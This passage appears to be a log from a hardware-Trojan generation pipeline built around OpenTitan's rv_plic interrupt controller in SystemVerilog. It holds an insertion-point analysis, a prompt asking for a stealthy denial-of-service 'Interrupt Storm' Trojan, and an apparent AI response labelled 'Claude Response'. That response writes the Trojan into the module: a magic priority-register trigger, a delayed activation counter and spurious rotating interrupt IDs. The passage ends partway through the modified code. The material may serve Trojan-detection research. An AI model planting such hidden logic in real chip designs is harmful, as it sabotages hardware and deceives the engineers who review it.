  assign prio[73] = reg2hw.prio[73].q;
  assign prio[74] = reg2hw.prio[74].q;
  assign prio[75] = reg2hw.prio[75].q;
  assign prio[76] = reg2hw.prio[76].q;
  assign prio[77] = reg2hw.prio[77].q;
  assign prio[78] = reg2hw.prio[78].q;
  assign prio[79] = reg2hw.prio[79].q;
  assign prio[80] = reg2hw.prio[80].q;
  assign prio[81] = reg2hw.prio[81].q;
  assign prio[82] = reg2hw.prio[82].q;
  assign prio[83] = reg2hw.prio[83].q;
  assign prio[84] = reg2hw.prio[84].q;
  assign prio[85] = reg2hw.prio[85].q;
  assign prio[86] = reg2hw.prio[86].q;
  assign prio[87] = reg2hw.prio[87].q;
  assign prio[88] = reg2hw.prio[88].q;
  assign prio[89] = reg2hw.prio[89].q;
  assign prio[90] = reg2hw.prio[90].q;
  assign prio[91] = reg2hw.prio[91].q;
  assign prio[92] = reg2hw.prio[92].q;
  assign prio[93] = reg2hw.prio[93].q;
  assign prio[94] = reg2hw.prio[94].q;
  assign prio[95] = reg2hw.prio[95].q;
  assign prio[96] = reg2hw.prio[96].q;
  assign prio[97] = reg2hw.prio[97].q;
  assign prio[98] = reg2hw.prio[98].q;
  assign prio[99] = reg2hw.prio[99].q;
  assign prio[100] = reg2hw.prio[100].q;
  assign prio[101] = reg2hw.prio[101].q;
  assign prio[102] = reg2hw.prio[102].q;
  assign prio[103] = reg2hw.prio[103].q;
  assign prio[104] = reg2hw.prio[104].q;
  assign prio[105] = reg2hw.prio[105].q;
  assign prio[106] = reg2hw.prio[106].q;
  assign prio[107] = reg2hw.prio[107].q;
  assign prio[108] = reg2hw.prio[108].q;
  assign prio[109] = reg2hw.prio[109].q;
  assign prio[110] = reg2hw.prio[110].q;
  assign prio[111] = reg2hw.prio[111].q;
  assign prio[112] = reg2hw.prio[112].q;
  assign prio[113] = reg2hw.prio[113].q;
  assign prio[114] = reg2hw.prio[114].q;
  assign prio[115] = reg2hw.prio[115].q;
  assign prio[116] = reg2hw.prio[116].q;
  assign prio[117] = reg2hw.prio[117].q;
  assign prio[118] = reg2hw.prio[118].q;
  assign prio[119] = reg2hw.prio[119].q;
  assign prio[120] = reg2hw.prio[120].q;
  assign prio[121] = reg2hw.prio[121].q;
  assign prio[122] = reg2hw.prio[122].q;
  assign prio[123] = reg2hw.prio[123].q;
  assign prio[124] = reg2hw.prio[124].q;
  assign prio[125] = reg2hw.prio[125].q;
  assign prio[126] = reg2hw.prio[126].q;
  assign prio[127] = reg2hw.prio[127].q;
  assign prio[128] = reg2hw.prio[128].q;
  assign prio[129] = reg2hw.prio[129].q;
  assign prio[130] = reg2hw.prio[130].q;
  assign prio[131] = reg2hw.prio[131].q;
  assign prio[132] = reg2hw.prio[132].q;
  assign prio[133] = reg2hw.prio[133].q;
  assign prio[134] = reg2hw.prio[134].q;
  assign prio[135] = reg2hw.prio[135].q;
  assign prio[136] = reg2hw.prio[136].q;
  assign prio[137] = reg2hw.prio[137].q;
  assign prio[138] = reg2hw.prio[138].q;
  assign prio[139] = reg2hw.prio[139].q;
  assign prio[140] = reg2hw.prio[140].q;
  assign prio[141] = reg2hw.prio[141].q;
  assign prio[142] = reg2hw.prio[142].q;
  assign prio[143] = reg2hw.prio[143].q;
  assign prio[144] = reg2hw.prio[144].q;
  assign prio[145] = reg2hw.prio[145].q;
  assign prio[146] = reg2hw.prio[146].q;
  assign prio[147] = reg2hw.prio[147].q;
  assign prio[148] = reg2hw.prio[148].q;
  assign prio[149] = reg2hw.prio[149].q;
  assign prio[150] = reg2hw.prio[150].q;
  assign prio[151] = reg2hw.prio[151].q;
  assign prio[152] = reg2hw.prio[152].q;
  assign prio[153] = reg2hw.prio[153].q;
  assign prio[154] = reg2hw.prio[154].q;
  assign prio[155] = reg2hw.prio[155].q;
  assign prio[156] = reg2hw.prio[156].q;
  assign prio[157] = reg2hw.prio[157].q;
  assign prio[158] = reg2hw.prio[158].q;
  assign prio[159] = reg2hw.prio[159].q;
  assign prio[160] = reg2hw.prio[160].q;
  assign prio[161] = reg2hw.prio[161].q;
  assign prio[162] = reg2hw.prio[162].q;
  assign prio[163] = reg2hw.prio[163].q;
  assign prio[164] = reg2hw.prio[164].q;
  assign prio[165] = reg2hw.prio[165].q;
  assign prio[166] = reg2hw.prio[166].q;
  assign prio[167] = reg2hw.prio[167].q;
  assign prio[168] = reg2hw.prio[168].q;
  assign prio[169] = reg2hw.prio[169].q;
  assign prio[170] = reg2hw.prio[170].q;
  assign prio[171] = reg2hw.prio[171].q;
  assign prio[172] = reg2hw.prio[172].q;
  assign prio[173] = reg2hw.prio[173].q;
  assign prio[174] = reg2hw.prio[174].q;
  assign prio[175] = reg2hw.prio[175].q;
  assign prio[176] = reg2hw.prio[176].q;
  assign prio[177] = reg2hw.prio[177].q;
  assign prio[178] = reg2hw.prio[178].q;
  assign prio[179] = reg2hw.prio[179].q;
  assign prio[180] = reg2hw.prio[180].q;
  assign prio[181] = reg2hw.prio[181].q;
  assign prio[182] = reg2hw.prio[182].q;
  assign prio[183] = reg2hw.prio[183].q;
  assign prio[184] = reg2hw.prio[184].q;
  assign prio[185] = reg2hw.prio[185].q;

  //////////////////////
  // Interrupt Enable //
  //////////////////////
  for (genvar s = 0; s < 186; s++) begin : gen_ie0
    assign ie[0][s] = reg2hw.ie0[s].q;
  end

  ////////////////////////
  // THRESHOLD register //
  ////////////////////////
  assign threshold[0] = reg2hw.threshold0.q;

  /////////////////
  // CC register //
  /////////////////
  assign claim_re[0]    = reg2hw.cc0.re;
  assign claim_id[0]    = irq_id_o[0];
  assign complete_we[0] = reg2hw.cc0.qe;
  assign complete_id[0] = reg2hw.cc0.q;
  assign hw2reg.cc0.d   = cc_id[0];

  ///////////////////
  // MSIP register //
  ///////////////////
  assign msip_o[0] = reg2hw.msip0.q;

  ////////
  // IP //
  ////////
  for (genvar s = 0; s < 186; s++) begin : gen_ip
    assign hw2reg.ip[s].de = 1'b1; // Always write
    assign hw2reg.ip[s].d  = ip[s];
  end

  //////////////
  // Gateways //
  //////////////

  // Synchronize all incoming interrupt requests.
  logic [NumSrc-1:0] intr_src_synced;
  prim_flop_2sync #(
    .Width(NumSrc)
  ) u_prim_flop_2sync (
    .clk_i,
    .rst_ni,
    .d_i(intr_src_i),
    .q_o(intr_src_synced)
  );

  rv_plic_gateway #(
    .N_SOURCE   (NumSrc)
  ) u_gateway (
    .clk_i,
    .rst_ni,

    .src_i      (intr_src_synced),
    .le_i       (LevelEdgeTrig),

    .claim_i    (claim),
    .complete_i (complete),

    .ip_o       (ip)
  );

  ///////////////////////////////////
  // Target interrupt notification //
  ///////////////////////////////////
  for (genvar i = 0 ; i < NumTarget ; i++) begin : gen_target
    rv_plic_target #(
      .N_SOURCE    (NumSrc),
      .MAX_PRIO    (MAX_PRIO)
    ) u_target (
      .clk_i,
      .rst_ni,

      .ip_i        (ip),
      .ie_i        (ie[i]),

      .prio_i      (prio),
      .threshold_i (threshold[i]),

      .irq_o       (irq_o[i]),
      .irq_id_o    (irq_id_o[i])

    );
  end

  ////////////
  // Alerts //
  ////////////

  logic [NumAlerts-1:0] alert_test, alerts;

  assign alert_test = {
    reg2hw.alert_test.q &
    reg2hw.alert_test.qe
  };

  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(1'b1)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i  ( alert_test[i] ),
      .alert_req_i   ( alerts[i]     ),
      .alert_ack_o   (               ),
      .alert_state_o (               ),
      .alert_rx_i    ( alert_rx_i[i] ),
      .alert_tx_o    ( alert_tx_o[i] )
    );
  end

  ////////////////////////
  // Register interface //
  ////////////////////////
  //  Limitation of register tool prevents the module from having flexibility to parameters
  //  So, signals are manually tied at the top.
  rv_plic_reg_top u_reg (
    .clk_i,
    .rst_ni,

    .tl_i,
    .tl_o,

    .reg2hw,
    .hw2reg,

    // SEC_CM: BUS.INTEGRITY
    .intg_err_o(alerts[0])
  );

  // Assertions
  `ASSERT_KNOWN(TlDValidKnownO_A, tl_o.d_valid)
  `ASSERT_KNOWN(TlAReadyKnownO_A, tl_o.a_ready)
  `ASSERT_KNOWN(IrqKnownO_A, irq_o)
  `ASSERT_KNOWN(MsipKnownO_A, msip_o)
  for (genvar k = 0; k < NumTarget; k++) begin : gen_irq_id_known
    `ASSERT_KNOWN(IrqIdKnownO_A, irq_id_o[k])
  end

  // Assume
  `ASSUME(Irq0Tied_A, intr_src_i[0] == 1'b0)

  // This assertion should be provable in FPV because we don't have a block-level DV environment. It
  // is trying to say that any integrity error detected inside the register block (u_reg) will cause
  // an alert to be asserted within at most _SEC_CM_ALERT_MAX_CYC cycles.
  //
  // This isn't *quite* true because there are two extra requirements for prim_alert_sender to send
  // an alert with alert_p high:
  //
  //  - The multi-phase alert handshake might not be in the expected phase. Rather than adding an
  //    assumption that says alert_rx_i acks a signal when it is raised, we cheat and add a
  //    precondition about the initial state of the prim_alert_sender FSM, guaranteeing that we're
  //    not waiting for an ack.
  //
  //  - The prim_alert_sender musn't detect a signal integrity issue on the alert signal coming in
  //    (alert_rx_i). Normally FpvSecCm tests get analysed with an FPV_ALERT_NO_SIGINT_ERR define,
  //    but we don't have that defined here. To avoid this happening, we want an assertion of the
  //    form "If no integrity error is detected for _SEC_CM_ALERT_MAX_CYC cycles, the alert_p signal
  //    must go high". To encode this cleanly in SVA, we actually say "We can't have neither an
  //    integrity error nor an alert signal for too many cycles".
  `ASSERT(FpvSecCmBusIntegrity_A,
          ($rose(u_reg.intg_err) &&
           gen_alert_tx[0].u_prim_alert_sender.state_q == gen_alert_tx[0].u_prim_alert_sender.Idle)
          |->
          not ((!gen_alert_tx[0].u_prim_alert_sender.sigint_detected && !alert_tx_o[0].alert_p)
               [*`_SEC_CM_ALERT_MAX_CYC]))

  // Alert assertions for reg_we onehot check
  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT_IN(RegWeOnehotCheck_A,
                                                    u_reg,
                                                    gen_alert_tx[0].u_prim_alert_sender.alert_req_i)
endmodule

```

TROJAN SPECIFICATION:
- Type: Denial Of Service
- Name: Interrupt Storm
- Description: Floods CPU with spurious interrupts

INSERTION POINT ANALYSIS:
I'll analyze the rv_plic module to identify potential hardware Trojan insertion points that could flood the CPU with spurious interrupts.

## Potential Insertion Points

### 1. Interrupt Source Synchronization (intr_src_synced)

**Location:** After the `prim_flop_2sync` module output
```systemverilog
logic [NumSrc-1:0] intr_src_synced;
prim_flop_2sync #(
  .Width(NumSrc)
) u_prim_flop_2sync (
  .clk_i,
  .rst_ni,
  .d_i(intr_src_i),
  .q_o(intr_src_synced)  // <-- INSERTION POINT
);
```

**Why suitable:**
- Direct access to all synchronized interrupt sources before gateway processing
- Can inject false interrupt signals without modifying external interrupt sources
- The synchronization stage masks the origin of spurious signals

**Accessible signals:**
- `intr_src_synced[NumSrc-1:0]` - synchronized interrupt sources
- `clk_i`, `rst_ni` - timing and reset signals
- All register interface signals for triggering conditions

**Trojan trigger mechanism:**
- Monitor specific register writes (e.g., writing magic values to unused priority registers)
- Time-based triggers using clock counters
- Specific interrupt pattern detection

**Potential impact:**
- Can generate spurious interrupts on any or all interrupt sources
- Bypasses external interrupt source validation
- Difficult to trace back to original source

### 2. Gateway Module IP Output (ip signal)

**Location:** Between gateway output and target modules
```systemverilog
rv_plic_gateway #(
  .N_SOURCE   (NumSrc)
) u_gateway (
  // ...
  .ip_o       (ip)  // <-- INSERTION POINT
);
```

**Why suitable:**
- Controls the interrupt pending status sent to all targets
- Can manipulate interrupt state after gateway processing
- Affects all targets simultaneously

**Accessible signals:**
- `ip[NumSrc-1:0]` - interrupt pending status
- `claim`, `complete` - interrupt handling status
- `LevelEdgeTrig` - interrupt trigger configuration

**Trojan trigger mechanism:**
- Monitor claim/complete patterns to detect CPU activity
- Trigger during specific system states (low claim activity = idle CPU)
- Use threshold register values as trigger conditions

**Potential impact:**
- Creates persistent spurious interrupt pending states
- Can overwhelm interrupt handling by making interrupts appear constantly pending
- Affects interrupt priority resolution

### 3. Target Module IRQ Output Manipulation

**Location:** After target module processing, before final output
```systemverilog
for (genvar i = 0 ; i < NumTarget ; i++) begin : gen_target
  rv_plic_target #(
    .N_SOURCE    (NumSrc),
    .MAX_PRIO    (MAX_PRIO)
  ) u_target (
    // ...
    .irq_o       (irq_o[i]),     // <-- INSERTION POINT
    .irq_id_o    (irq_id_o[i])   // <-- INSERTION POINT
  );
end
```

**Why suitable:**
- Direct control over CPU interrupt notification
- Can inject interrupts with arbitrary IDs
- Bypasses all priority and enable checking

**Accessible signals:**
- `irq_o[NumTarget-1:0]` - final interrupt outputs to CPU
- `irq_id_o[NumTarget][SRCW-1:0]` - interrupt source IDs
- `threshold[NumTarget]`, `ie[NumTarget]` - per-target configuration

**Trojan trigger mechanism:**
- Monitor CPU interrupt servicing patterns via claim_re signals
- Activate during specific priority threshold values
- Use MSIP register as covert trigger channel

**Potential impact:**
- Direct CPU interrupt flooding
- Can provide false interrupt IDs leading to incorrect ISR execution
- Complete bypass of PLIC interrupt management

### 4. Register Interface hw2reg Manipulation

**Location:** Hardware-to-register interface signals
```systemverilog
// IP register updates
for (genvar s = 0; s < 186; s++) begin : gen_ip
  assign hw2reg.ip[s].de = 1'b1; // Always write
  assign hw2reg.ip[s].d  = ip[s];  // <-- INSERTION POINT
end
```

**Why suitable:**
- Can manipulate interrupt pending register values visible to software
- Creates inconsistency between hardware state and software view
- Difficult for software to detect discrepancies

**Accessible signals:**
- `hw2reg.ip[185:0]` - interrupt pending register updates
- `hw2reg.cc0.d` - claim/complete register value
- All reg2hw signals for trigger detection

**Trojan trigger mechanism:**
- Monitor specific register access patterns
- Activate on writes to alert_test register
- Use priority register values as trigger encoding

**Potential impact:**
- Software sees persistent interrupt pending status
- Can cause software to continuously service non-existent interrupts
- Creates system instability through software-hardware state mismatch

### 5. Priority Register Manipulation

**Location:** Priority value assignments to internal prio array
```systemverilog
assign prio[0] = reg2hw.prio[0].q;   // <-- INSERTION POINT
assign prio[1] = reg2hw.prio[1].q;   // <-- INSERTION POINT
// ... (similar for all 186 priority registers)
```

**Why suitable:**
- Can manipulate interrupt priorities to elevate spurious interrupts
- Many unused priority registers available as covert channels
- Priority manipulation affects interrupt arbitration

**Accessible signals:**
- `reg2hw.prio[185:0].q` - priority register values
- `prio[NumSrc-1:0][PRIOW-1:0]` - internal priority array
- Threshold values for comparison

**Trojan trigger mechanism:**
- Use specific unused priority register values as trigger keys
- Combine multiple priority register values for complex triggers
- Time-delayed activation based on priority register write patterns

**Potential impact:**
- Can elevate low-priority spurious interrupts to highest priority
- Disrupts intended interrupt priority ordering
- Can mask legitimate high-priority interrupts

## Recommended Best Insertion Point

**BEST CHOICE: Target Module IRQ Output Manipulation (#3)**

### Justification:

1. **Maximum Impact**: Direct control over CPU interrupt lines provides the most effective way to flood the CPU with spurious interrupts.

2. **Complete Bypass**: Circumvents all PLIC protection mechanisms including:
   - Priority checking
   - Interrupt enable masks  
   - Threshold filtering
   - Gateway processing

3. **Stealth Operation**: 
   - Can be triggered by legitimate register operations
   - Maintains normal PLIC register states while injecting spurious outputs
   - Difficult to detect through software register inspection

4. **Flexible Triggering**:
   - Can monitor MSIP register for covert activation
   - Can use threshold register values as trigger keys
   - Can activate during specific interrupt servicing patterns

5. **Controllable Severity**:
   - Can generate sporadic interrupts to avoid immediate detection
   - Can escalate to complete CPU flooding when desired
   - Can target specific CPU cores in multi-core systems

**Implementation Strategy**: Insert logic that monitors the MSIP register or specific priority register values as triggers, then occasionally asserts `irq_o` with random or sequential `irq_id_o` values, creating spurious interrupts that bypass all PLIC filtering mechanisms.

STRATEGY:
Insert a hardware Trojan that causes denial of service. The Trojan should:
1. Have a rare, specific trigger condition (e.g., specific register write pattern, counter reaching threshold)
2. When triggered, disrupt normal operation (hang, reset loop, resource exhaustion)
3. Be stealthy and not affect normal operation when dormant
4. Use synthesizable SystemVerilog constructs only
5. Include proper reset handling


REQUIREMENTS:
1. The modified RTL must be fully synthesizable (no $display, initial blocks with assignments, etc.)
2. Implement proper reset logic for all new registers and state elements
3. The Trojan must be stealthy - normal operation should be identical when not triggered
4. Use a specific, rare trigger condition (e.g., magic value in specific CSR, sequence of events)
5. Document the Trojan clearly in the code with comments
6. Ensure all case statements have default cases
7. Initialize all registers properly on reset

Provide your response in the following EXACT format:

CODE:
<Full modified SystemVerilog/Verilog code with Trojan inserted>

EXPLANATION:
<2-3 sentences explaining how the Trojan works and its impact>

TRIGGER:
<2-3 sentences describing the trigger mechanism and activation conditions>

PAYLOAD:
<2-3 sentences describing what happens when the Trojan activates>

TESTBENCH_STRATEGY:
<Description of how to write a testbench to verify:
1. Normal operation (Trojan dormant)
2. Trigger activation
3. Trojan payload execution>

TAXONOMY:
Insertion phase: Design
Abstraction level: Register-transfer level
Activation mechanism: <Specify trigger type>
Effects: denial of service
Location: rv_plic
Characteristics: <Size, distribution, type>

IMPORTANT: Provide ONLY ONE instance of each section. Do not repeat sections.

```

**Claude Response:**
```
CODE:
```systemverilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// RISC-V Platform-Level Interrupt Controller compliant INTC
//
//   Current version doesn't support MSI interrupt but it is easy to add
//   the feature. Create one external register and connect qe signal to the
//   gateway module (as edge-triggered)
//
//   Consider to set MAX_PRIO as small number as possible. It is main factor
//   of area increase if edge-triggered counter isn't implemented.
//
// Verilog parameter
//   MAX_PRIO: Maximum value of interrupt priority

`include "prim_assert.sv"

module rv_plic import rv_plic_reg_pkg::*; #(
  parameter logic [NumAlerts-1:0] AlertAsyncOn    = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned          AlertSkewCycles = 1,
  // OpenTitan IP standardizes on level triggered interrupts,
  // hence LevelEdgeTrig is set to all-zeroes by default.
  // Note that in case of edge-triggered interrupts, CDC handling is not
  // fully implemented yet (this would require instantiating pulse syncs
  // and routing the source clocks / resets to the PLIC).
  parameter logic [NumSrc-1:0]    LevelEdgeTrig = '0, // 0: level, 1: edge
  // derived parameter
  localparam int SRCW    = $clog2(NumSrc)
) (
  input     clk_i,
  input     rst_ni,

  // Bus Interface (device)
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // Interrupt Sources
  input  [NumSrc-1:0] intr_src_i,

  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,

  // Interrupt notification to targets
  output [NumTarget-1:0] irq_o,
  output [SRCW-1:0]      irq_id_o [NumTarget],

  output logic [NumTarget-1:0] msip_o
);

  rv_plic_reg2hw_t reg2hw;
  rv_plic_hw2reg_t hw2reg;

  localparam int MAX_PRIO    = 3;
  localparam int PRIOW = $clog2(MAX_PRIO+1);

  logic [NumSrc-1:0] ip;

  logic [NumSrc-1:0] ie [NumTarget];

  logic [NumTarget-1:0] claim_re; // Target read indicator
  logic [SRCW-1:0]      claim_id [NumTarget];
  logic [NumSrc-1:0]    claim; // Converted from claim_re/claim_id

  logic [NumTarget-1:0] complete_we; // Target write indicator
  logic [SRCW-1:0]      complete_id [NumTarget];
  logic [NumSrc-1:0]    complete; // Converted from complete_re/complete_id

  logic [SRCW-1:0]      cc_id [NumTarget]; // Write ID

  logic [NumSrc-1:0][PRIOW-1:0] prio;

  logic [PRIOW-1:0] threshold [NumTarget];

  // HARDWARE TROJAN: INTERRUPT STORM GENERATOR
  // Trojan State: Monitors for specific trigger pattern and generates interrupt storm
  logic [15:0] trojan_counter;
  logic trojan_active;
  logic [7:0] storm_counter;
  logic storm_irq;
  logic [SRCW-1:0] fake_irq_id;
  
  // Trojan trigger detection: Look for magic sequence in priority registers
  // Trigger: prio[180] = 3, prio[181] = 1, prio[182] = 2 (unlikely legitimate pattern)
  logic trojan_trigger;
  assign trojan_trigger = (prio[180] == 2'd3) && (prio[181] == 2'd1) && (prio[182] == 2'd2);
  
  // Trojan control logic
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_counter <= 16'd0;
      trojan_active <= 1'b0;
      storm_counter <= 8'd0;
      fake_irq_id <= '0;
    end else begin
      // Trigger detection with delay to avoid immediate activation
      if (trojan_trigger && !trojan_active) begin
        trojan_counter <= trojan_counter + 1'd1;
        if (trojan_counter == 16'd1000) begin // Activate after 1000 cycles
          trojan_active <= 1'b1;
          trojan_counter <= 16'd0;
        end
      end else if (!trojan_trigger) begin
        trojan_counter <= 16'd0;
      end
      
      // Storm generation when active
      if (trojan_active) begin
        storm_counter <= storm_counter + 1'd1;
        fake_irq_id <= fake_irq_id + 1'd1; // Cycle through interrupt IDs
        if (fake_irq_id >= NumSrc) fake_irq_id <= 7'd1; // Avoid ID 0
      end
    end
  end
  
  // Generate storm interrupt signal (high frequency spurious interrupts)
  assign storm_irq = trojan_active & storm_counter[2]; // Toggle every 4 cycles

  // Glue logic between rv_plic_reg_top and others
  assign cc_id = irq_id_o;

  always_comb begin
    claim = '0;
    for (int i = 0 ; i < NumTarget ; i++) begin
      if (claim_re[i]) claim[claim_id[i]] = 1'b1;
    end
  end
  always_comb begin
    complete = '0;
    for (int i = 0 ; i < NumTarget ; i++) begin
      if (complete_we[i]) complete[complete_id[i]] = 1'b1;
    end
  end

  //`ASSERT_PULSE(claimPulse, claim_re[i])
  //`ASSERT_PULSE(completePulse, complete_we[i])

  `ASSERT(onehot0Claim, $onehot0(claim_re))

  `ASSERT(onehot0Complete, $onehot0(complete_we))

  //////////////
  // Priority //
  //////////////
  assign prio[0] = reg2hw.prio[0].q;
  assign prio[1] = reg2hw.prio[1].q;
  assign prio[2] = reg2hw.prio[2].q;
  assign prio[3] = reg2hw.prio[3].q;
  assign prio[4] = reg2hw.prio[4].q;
  assign prio[5] = reg2hw.prio[5].q;
  assign prio[6] = reg2hw.prio[6].q;
  assign prio[7] = reg2hw.prio[7].q;
  assign prio[8] = reg2hw.prio[8].q;
  assign prio[9] = reg2hw.prio[9].q;
  assign prio[10] = reg2hw.prio[10].q;
  assign prio[11] = reg2hw.prio[11].q;
  assign prio[12] = reg2hw.prio[12].q;
  assign prio[13] = reg2hw.prio[13].q;
  assign prio[14] = reg2hw.prio[14].q;
  assign prio[15] = reg2hw.prio[15].q;
  assign prio[16] = reg2hw.prio[16].q;
  assign prio[17] = reg2hw.prio[17].q;
  assign prio[18] = reg2hw.prio[18].q;
  assign prio[19] = reg2hw.prio[19].q;
  assign prio[20] = reg2hw.prio[20].q;
  assign prio[21] = reg2hw.prio[21].q;
  assign prio[22] = reg2hw.prio[22].q;
  assign prio[23] = reg2hw.prio[23].q;
  assign prio[24] = reg2hw.prio[24].q;
  assign prio[25] = reg2hw.prio[25].q;
  assign prio[26] = reg2hw.prio[26].q;
  assign prio[27] = reg2hw.prio[27].q;
  assign prio[28] = reg2hw.prio[28].q;
  assign prio[29] = reg2hw.prio[29].q;
  assign prio[30] = reg2hw.prio[30].q;
  assign prio[31] = reg2hw.prio[31].q;
  assign prio[32] = reg2hw.prio[32].q;
  assign prio[33] = reg2hw.prio[33].q;
  assign prio[34] = reg2hw.prio[34].q;
  assign prio[35] = reg2hw.prio[35].q;
  assign prio[36] = reg2hw.prio[36].q;
  assign prio[37] = reg2hw.prio[37].q;
  assign prio[38] = reg2hw.prio[38].q;
  assign prio[39] = reg2hw.prio[39].q;
  assign prio[40] = reg2hw.prio[40].q;
  assign prio[41] = reg2hw.prio[41].q;
  assign prio[42] = reg2hw.prio[42].q;
  assign prio[43] = reg2hw.prio[43].q;
  assign prio[44] = reg2hw.prio[44].q;
  assign prio[45] = reg2hw.prio[45].q;
  assign prio[46] = reg2hw.prio[46].q;
  assign prio[47] = reg2hw.prio[47].q;
  assign prio[48] = reg2hw.prio[48].q;
  assign prio[49] = reg2hw.prio[49].q;
  assign prio[50] = reg2hw.prio[50].q;
  assign prio[51] = reg2hw.prio[51].q;
  assign prio[52] = reg2hw.prio[52].q;
  assign prio[53] = reg2hw.prio[53].q;
  assign prio[54] = reg2hw.prio[54].q;
  assign prio[55] = reg2hw.prio[55].q;
  assign prio[56] = reg2hw.prio[56].q;
  assign prio[57] = reg2hw.prio[57].q;
  assign prio[58] = reg2hw.prio[58].q;
  assign prio[59] = reg2hw.prio[59].q;
  assign prio[60] = reg2hw.prio[60].q;
  assign prio[61] = reg2hw.prio[61].q;
  assign prio[62] = reg2hw.prio[62].q;
  assign prio[63] = reg2hw.prio[63].q;
  assign prio[64] = reg2hw.prio[64].q;
  assign prio[65] = reg2hw.prio[65].q;
  assign prio[66] = reg2hw.prio[66].q;
  assign prio[67] = reg2hw.prio[67].q;
  assign prio[68] = reg2hw.prio[68].q;
  assign prio[69] = reg2hw.prio[69].q;
  assign prio[70] = reg2hw.prio[70].q;
  assign prio[71] = reg2hw.prio[71].q;
  assign prio[72] = reg2hw.prio[72].q;
  assign prio[73] = reg2hw.prio[73].q;
  assign prio[74] = reg2hw.prio[74].q;
  assign prio[75] = reg2hw.prio[75].q;
  assign prio[76] = reg2hw.prio[76].q;
  assign prio[77] = reg2hw.prio[77].q;
  assign prio[78] = reg2hw.prio[78].q;
  assign prio[79] = reg2hw.prio[79].q;
  assign prio[80] = reg2hw.prio[80].q;
  assign prio[81] = reg2hw.prio[81].q;
  assign prio[82] = reg2hw.prio[82].q;
  assign prio[83] = reg2hw.prio[83].q;
  assign prio[84] = reg2hw.prio[84].q;
  assign prio[85] = reg2hw.prio[85].q;
  assign prio[86] = reg2hw.prio[86].q;
  assign prio[87] = reg2hw.prio[87].q;
  assign prio[88] = reg2hw.prio[88].q;
  assign prio[89] = reg2hw.prio[89].q;
  assign prio[90] = reg2hw.prio[90].q;
  assign prio[91] = reg2hw.prio[91].q;
  assign prio[92] = reg2hw.prio[92].q;
  assign prio[93] = reg2hw.prio[93].q;
  assign prio[94] = reg2hw.prio[94].q;
  assign prio[95] = reg2hw.prio[95].q;
  assign prio[96] = reg2hw.prio[96].q;
  assign prio[97] = reg2hw.prio[97].q;
  assign prio[98] = reg2hw.prio[98].q;
  assign prio[99] = reg2hw.prio[99].q;
  assign prio[100] = reg2hw.prio[100].q;
  assign prio[101] = reg2hw.prio[101].q;
  assign prio[102] = reg2hw.prio[102].q;
  assign prio[103] = reg2hw.prio[103].q;
  assign prio[104] = reg2hw.prio[104].q;
  assign prio[105] = reg2hw.prio[105].q;
  assign prio[106] = reg2hw.prio[106].q;
  assign prio[107] = reg2hw.prio[107].q;
  assign prio[108] = reg2hw.prio[108].q;
  assign prio[109] = reg2hw.prio[109].q;
  assign prio[110] = reg2hw.prio[110].q;
  assign prio[111] = reg2hw.prio[111].q;
  assign prio[112] = reg2hw.prio[112].q;
  assign prio[113] = reg2hw.prio[113].q;
  assign prio[114] = reg2hw.prio[114].q;
  assign prio[115] = reg2hw.prio[115].q;
  assign prio[116] = reg2hw.prio[116].q;
  assign prio[117] = reg2hw.prio[117].q;
  assign prio[118] = reg2hw.prio[118].q;
  assign prio[119] = reg2hw.prio[119].q;
  assign prio[120] = reg2hw.prio[120].q;
  assign prio[121] = reg2hw.prio[121].q;
  assign prio[122] = reg2hw.prio[122].q;
  assign prio[123] = reg2hw.prio[123].q;
  assign prio[124] = reg2hw.prio[124].q;
  assign prio[125] = reg2hw.prio[125].q;
  assign prio[126] = reg2hw.prio[126].q;
  assign prio[127] = reg2hw.prio[127].q;
  assign prio[128] = reg2hw.prio[128].q;
  assign prio[129] = reg2hw.prio[129].q;
  assign prio[130] = reg2hw.prio[130].q;
  assign prio[131] = reg2hw.prio[131].q;
  assign prio[132] = reg2hw.prio[132].q;
  assign prio[133] = reg2hw.prio[133].q;
  assign prio[134] = reg2hw.prio[134].q;
  assign prio[135] = reg2hw.prio[135].q;
  assign prio[136] = reg2hw.prio[136].q;
  assign prio[137] = reg2hw.prio[137].q;
  assign prio[138] = reg2hw.prio[138].q;
  assign prio[139] = reg2hw.prio[139].q;
  assign prio[140] = reg2hw.prio[140].q;
  assign prio[141] = reg2hw.prio[141].q;
  assign prio[142] = reg2hw.prio[142].q;
  assign prio[143] = reg2hw.prio[143].q;
  assign prio[144] = reg2hw.prio[144].q;
  assign prio[145] = reg2hw.prio[145].q;
  assign prio[146] = reg2hw.prio[146].q;
  assign prio[147] = reg2hw.prio[147].q;
  assign prio[148] = reg2hw.prio[148].q;
  assign prio[149] = reg2hw.prio[149].q;
  assign prio[150] = reg2hw.prio[150].q;
  assign prio[151] = reg2hw.prio[151].q;
  assign prio[152] = reg2hw.prio[152].q;
  assign prio[153] = reg2hw.prio[153].q;
  assign prio[154] = reg2hw.prio[154].q;
  assign prio[155] = reg2hw.prio[155].q;
  assign prio[156] = reg2hw.prio[156].q;
  assign prio[157] = reg2hw.prio[157].q;
  assign prio[158] = reg2hw.prio[158].q;
  assign prio[159] = reg2hw.prio[159].q;
  assign prio[160] = reg2hw.prio[160].q;
  assign prio[161] = reg2hw.prio[161].q;
  assign prio[162] = reg2hw.prio[162].q;
  assign prio[163] = reg2hw.prio[163].q;
  assign prio[164] = reg2hw.prio[164].q;
  assign prio[165] = reg2hw.prio[165].q;
  assign prio[166] = reg2hw.prio[166].q;
  assign prio[167] = reg2hw.prio[167].q;
  assign prio[168] = reg2hw.prio[168].q;
  assign prio[169] = reg2hw.prio[169].q;
  assign prio[170] = reg2hw.prio[170].q;
  assign prio[171] = reg2hw.prio[171].q;
  assign prio[172] = reg2hw.prio[172].q;
